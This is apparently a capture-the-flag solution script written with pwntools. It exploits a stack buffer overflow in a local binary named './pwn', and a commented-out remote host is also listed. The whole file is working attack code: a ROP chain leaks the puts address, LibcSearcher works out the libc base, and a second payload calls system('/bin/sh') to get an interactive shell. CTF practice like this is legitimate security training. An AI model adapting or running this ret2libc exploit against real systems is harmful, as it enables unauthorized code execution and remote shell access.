
#coding:utf8

 

from pwn import *

from LibcSearcher import * 

# context.log_level = 'debug'

process_name = './pwn'

p = process(process_name)

#p = remote('111.198.29.45', 39499)

elf = ELF(process_name)

 

main_addr = 0x4006B8

pop_rdi_ret = 0x400763

puts_got = elf.got['puts']

puts_plt = elf.plt['puts']

def get_puts(p):

	payload = 'A' * (0x40+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

	payload = payload.ljust(200, 'B')

 

	p.send(payload)

	p.recvuntil('bye~\n')

	puts_addr = u64(p.recv(6).ljust(8, '\x00'))

	log.info("puts_addr => %#x", puts_addr)

	p.recv(1)

 

	return puts_addr

 

puts_addr = get_puts(p)

 

libc = LibcSearcher('puts', puts_addr)

libc_base = puts_addr - libc.dump('puts')

system_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

 

payload = 'A' * (0x40+8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)

payload = payload.ljust(200, 'B')

p.sendline(payload)

 

p.interactive()

